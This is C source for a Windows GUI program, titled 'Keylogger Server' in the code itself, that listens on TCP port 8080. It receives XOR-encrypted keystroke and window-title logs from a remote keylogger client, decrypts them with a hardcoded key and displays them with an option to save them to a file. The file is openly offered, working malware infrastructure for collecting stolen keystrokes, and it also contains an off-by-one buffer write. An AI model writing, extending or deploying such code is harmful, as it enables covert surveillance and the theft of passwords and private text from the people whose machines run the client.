#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <commctrl.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "comctl32.lib")

#define PORT 8080
#define WM_SOCKET (WM_USER + 1)
#define MAX_BUFFER 4096
#define ENCRYPTION_KEY "S3cr3tK3y"

char displayBuffer[MAX_BUFFER * 10] = {0};
char currentWindow[256] = {0};
HWND mainWindow, hEdit, hScroll;
SOCKET server_fd, client_socket;
int scrollPos = 0;
int maxScrollPos = 0;
HFONT hFont;

void decryptData(char *data, int length) {
    int key_len = strlen(ENCRYPTION_KEY);
    for (int i = 0; i < length; i++) {
        data[i] ^= ENCRYPTION_KEY[i % key_len];
    }
}

void SaveToFile(const char *filename) {
    FILE *file = fopen(filename, "w");
    if (file) {
        fwrite(displayBuffer, 1, strlen(displayBuffer), file);
        fclose(file);
        MessageBox(mainWindow, "Log saved successfully!", "Success", MB_OK | MB_ICONINFORMATION);
    } else {
        MessageBox(mainWindow, "Failed to save log file!", "Error", MB_OK | MB_ICONERROR);
    }
}

void UpdateScrollBar() {
    SCROLLINFO si;
    si.cbSize = sizeof(si);
    si.fMask = SIF_RANGE | SIF_PAGE | SIF_POS;
    si.nMin = 0;
    si.nMax = maxScrollPos;
    si.nPage = 50;
    si.nPos = scrollPos;
    SetScrollInfo(hScroll, SB_CTL, &si, TRUE);
}

void ProcessIncomingData(const char *data, int length) {
    char tempBuffer[MAX_BUFFER] = {0};
    memcpy(tempBuffer, data, length);
    tempBuffer[length] = '\0';

    if (strstr(tempBuffer, "[Window: ")) {
        // Window title change - add to display as-is
        strcat(displayBuffer, tempBuffer);
    } else {
        // Regular keystrokes
        strcat(displayBuffer, tempBuffer);
    }

    // Keep buffer from overflowing
    if (strlen(displayBuffer) > sizeof(displayBuffer) - MAX_BUFFER) {
        memmove(displayBuffer, displayBuffer + strlen(displayBuffer)/2, 
               strlen(displayBuffer)/2 + 1);
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            CreateWindow(
                "BUTTON", "Save Log",
                WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                10, 10, 100, 30, hwnd, (HMENU)2, NULL, NULL);
            return 0;
        }

        case WM_SIZE: {
            int width = LOWORD(lParam);
            int height = HIWORD(lParam);
            MoveWindow(hEdit, 10, 50, width - 40, height - 100, TRUE);
            MoveWindow(hScroll, width - 30, 50, 20, height - 100, TRUE);
            UpdateScrollBar();
            return 0;
        }

        case WM_COMMAND: {
            if (LOWORD(wParam) == 2) {
                OPENFILENAME ofn;
                char filename[MAX_PATH] = {0};
                ZeroMemory(&ofn, sizeof(ofn));
                ofn.lStructSize = sizeof(ofn);
                ofn.hwndOwner = hwnd;
                ofn.lpstrFile = filename;
                ofn.nMaxFile = MAX_PATH;
                ofn.lpstrFilter = "Text Files (*.txt)\0*.txt\0All Files (*.*)\0*.*\0";
                ofn.Flags = OFN_PATHMUSTEXIST | OFN_OVERWRITEPROMPT;
                
                if (GetSaveFileName(&ofn)) {
                    SaveToFile(filename);
                }
            }
            return 0;
        }

        case WM_VSCROLL: {
            SCROLLINFO si = { sizeof(SCROLLINFO) };
            si.fMask = SIF_ALL;
            GetScrollInfo(hScroll, SB_CTL, &si);
            
            int oldPos = si.nPos;
            switch (LOWORD(wParam)) {
                case SB_LINEUP: si.nPos -= 1; break;
                case SB_LINEDOWN: si.nPos += 1; break;
                case SB_PAGEUP: si.nPos -= si.nPage; break;
                case SB_PAGEDOWN: si.nPos += si.nPage; break;
                case SB_THUMBTRACK: si.nPos = si.nTrackPos; break;
                default: break;
            }
            
            si.fMask = SIF_POS;
            SetScrollInfo(hScroll, SB_CTL, &si, TRUE);
            GetScrollInfo(hScroll, SB_CTL, &si);
            
            if (si.nPos != oldPos) {
                scrollPos = si.nPos;
                SendMessage(hEdit, EM_LINESCROLL, 0, si.nPos - oldPos);
            }
            return 0;
        }

        case WM_SOCKET: {
            if (WSAGETSELECTERROR(lParam)) {
                closesocket((SOCKET)wParam);
                return 0;
            }

            switch (WSAGETSELECTEVENT(lParam)) {
                case FD_ACCEPT: {
                    client_socket = accept(server_fd, NULL, NULL);
                    if (client_socket != INVALID_SOCKET) {
                        WSAAsyncSelect(client_socket, hwnd, WM_SOCKET, FD_READ | FD_CLOSE);
                    }
                    break;
                }
                
                case FD_READ: {
                    char buffer[MAX_BUFFER] = {0};
                    int bytes_read = recv(client_socket, buffer, MAX_BUFFER, 0);
                    if (bytes_read > 0) {
                        decryptData(buffer, bytes_read);
                        ProcessIncomingData(buffer, bytes_read);
                        
                        SetWindowText(hEdit, displayBuffer);
                        SendMessage(hEdit, EM_SETSEL, -1, -1);
                        SendMessage(hEdit, EM_SCROLLCARET, 0, 0);
                        
                        maxScrollPos = (int)(strlen(displayBuffer) / 50);
                        UpdateScrollBar();
                    }
                    break;
                }

                case FD_CLOSE: {
                    closesocket(client_socket);
                    break;
                }
            }
            return 0;
        }

        case WM_DESTROY: {
            closesocket(client_socket);
            closesocket(server_fd);
            WSACleanup();
            PostQuitMessage(0);
            return 0;
        }

        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const char CLASS_NAME[] = "Keylogger Server";
    
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    
    RegisterClass(&wc);

    mainWindow = CreateWindowEx(
        0, CLASS_NAME, "Keylogger Server",
        WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN,
        CW_USEDEFAULT, CW_USEDEFAULT, 800, 600,
        NULL, NULL, hInstance, NULL);

    hFont = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                      ANSI_CHARSET, OUT_DEFAULT_PRECIS,
                      CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                      DEFAULT_PITCH | FF_DONTCARE, "Consolas");

    hEdit = CreateWindowEx(
        WS_EX_CLIENTEDGE, "EDIT", "",
        WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | 
        ES_AUTOVSCROLL | ES_READONLY | ES_WANTRETURN,
        0, 0, 0, 0, mainWindow, NULL, hInstance, NULL);

    hScroll = CreateWindowEx(
        0, "SCROLLBAR", "",
        WS_CHILD | WS_VISIBLE | SBS_VERT,
        0, 0, 0, 0, mainWindow, (HMENU)1, hInstance, NULL);

    SendMessage(hEdit, WM_SETFONT, (WPARAM)hFont, TRUE);

    ShowWindow(mainWindow, nCmdShow);
    UpdateWindow(mainWindow);

    // Initialize server
    WSADATA wsa;
    struct sockaddr_in server_addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        MessageBox(mainWindow, "WSAStartup failed", "Error", MB_OK | MB_ICONERROR);
        return 0;
    }

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        MessageBox(mainWindow, "Socket creation failed", "Error", MB_OK | MB_ICONERROR);
        WSACleanup();
        return 0;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        MessageBox(mainWindow, "Bind failed", "Error", MB_OK | MB_ICONERROR);
        closesocket(server_fd);
        WSACleanup();
        return 0;
    }

    if (listen(server_fd, 3) == SOCKET_ERROR) {
        MessageBox(mainWindow, "Listen failed", "Error", MB_OK | MB_ICONERROR);
        closesocket(server_fd);
        WSACleanup();
        return 0;
    }

    WSAAsyncSelect(server_fd, mainWindow, WM_SOCKET, FD_ACCEPT | FD_READ | FD_CLOSE);

    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DeleteObject(hFont);
    return 0;
}